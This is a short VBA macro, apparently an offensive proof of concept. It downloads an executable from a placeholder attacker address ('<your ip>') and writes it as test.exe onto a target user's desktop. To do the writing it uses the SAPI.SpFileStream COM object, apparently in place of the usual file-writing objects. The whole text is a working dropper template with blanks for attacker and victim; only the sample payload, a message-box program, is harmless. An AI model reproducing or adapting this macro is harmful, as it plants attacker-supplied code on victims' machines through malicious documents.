'VBA macro to download and write HelloWorldMsgBox.exe as binary
Sub run()
  remotefile = "http://<your ip>/HelloWorldMsgBox.exe"
    Set HTTPReq = CreateObject("Microsoft.XMLHTTP")
    HTTPReq.Open "GET", remotefile, False
    HTTPReq.send

    Set objFSTRM = CreateObject("SAPI.SpFileStream.1")
      Call objFSTRM.Open("C:\\Users\\<target user>\\Desktop\\test.exe", 3, False)
    Call objFSTRM.Write("Mom's spaghetti")
    Call objFSTRM.Close
    
    Set objFSTRM = CreateObject("SAPI.SpFileStream.1")
    Call objFSTRM.Open("C:\\Users\\<target user>\\Desktop\\test.exe", 1, False)
    Call objFSTRM.Seek(0, 0)
    Call objFSTRM.Write(HTTPReq.responseBody)
    Call objFSTRM.Close
End Sub
